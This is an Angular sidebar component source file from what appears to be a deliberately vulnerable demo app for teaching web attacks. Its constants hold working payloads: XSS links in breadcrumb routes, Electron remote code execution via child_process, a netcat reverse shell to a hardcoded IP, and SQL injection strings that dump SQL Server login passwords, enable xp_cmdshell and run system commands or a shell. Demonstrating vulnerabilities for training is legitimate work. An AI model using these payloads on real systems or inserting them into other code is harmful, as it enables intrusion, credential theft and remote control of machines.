import { ChangeDetectionStrategy, Component } from '@angular/core';
import { AppRoutes, SqliRoutes, XssRoutes } from 'app/shared/models/app-routes.model';
import { User } from 'app/shared/models/user.model';
import { ElectronService } from 'app/shared/services/electron.service';

@Component({
    selector: 'vulnerable-app-sidebar',
    templateUrl: './app-sidebar.component.html',
    styleUrls: ['./app-sidebar.component.scss'],
    changeDetection: ChangeDetectionStrategy.OnPush
})
export class AppSidebarComponent {
    ROUTE_BREADCRUMBS: string = `${AppRoutes.XSS}/${XssRoutes.BREADCRUMBS}`;
    ROUTE_BREADCRUMBS_XSS: string = `${AppRoutes.XSS}/${XssRoutes.BREADCRUMBS}/<a href='javascript:alert("Uh oh... 😢")'>Breadcrumbs 2`;
    ROUTE_BREADCRUMBS_RCE_ELECTRON_DIR: string = `${AppRoutes.XSS}/${
        XssRoutes.BREADCRUMBS
    }/<a href='javascript:require(%22child_process%22).exec(%22dir%22, function (e,r) { alert(r)})'>Electron RCE - dir`;
    ROUTE_BREADCRUMBS_RCE_ELECTRON_SHELL: string = `${AppRoutes.XSS}/${
        XssRoutes.BREADCRUMBS
    }/<a href='javascript:require("child_process").exec("nc.exe 172.25.85.72 11235 -e cmd.exe", function (e,r) { alert(r)})'>Electron Shell - shell`;

    ROUTE_SQLI_EASY: string = `${AppRoutes.SQLI}/${SqliRoutes.EASY}`;

    SQLI_USER_101: User = { firstName: `' OR 1=1 --` };
    SQLI_USER_VERSION: User = { firstName: `' UNION SELECT @@VERSION,2,3,4,5,6 --` };
    SQLI_USER_ACCOUNTS: User = { firstName: `' UNION SELECT name,2,password,HOST_NAME(),5,DB_NAME() FROM master..syslogins --` };
    SQLI_USER_SHELL_SHOW_ADVANCED: User = { firstName: `'; EXEC sp_configure \'show advanced options\', 1;--` };
    SQLI_USER_SHELL_RECONFIGURE: User = { firstName: `'; RECONFIGURE;--` };
    SQLI_USER_XP_CMDSHELL: User = { firstName: `'; EXEC sp_configure \'xp_cmdshell\', 1;--` };
    SQLI_USER_XP_CMDSHELL_WHOAMI: User = { firstName: `'; EXEC xp_cmdshell \'whoami\';--` };
    SQLI_USER_XP_CMDSHELL_IPCONFIG: User = { firstName: `'; EXEC xp_cmdshell \'ipconfig\';--` };
    SQLI_USER_XP_CMDSHELL_SET: User = { firstName: `'; EXEC xp_cmdshell \'set\';--` };
    SQLI_USER_XP_CMDSHELL_SHELL: User = { firstName: `'; EXEC xp_cmdshell \'nc <IP> <PORT> -e cmd.exe\';--` };

    constructor(public electronService: ElectronService) {}
}
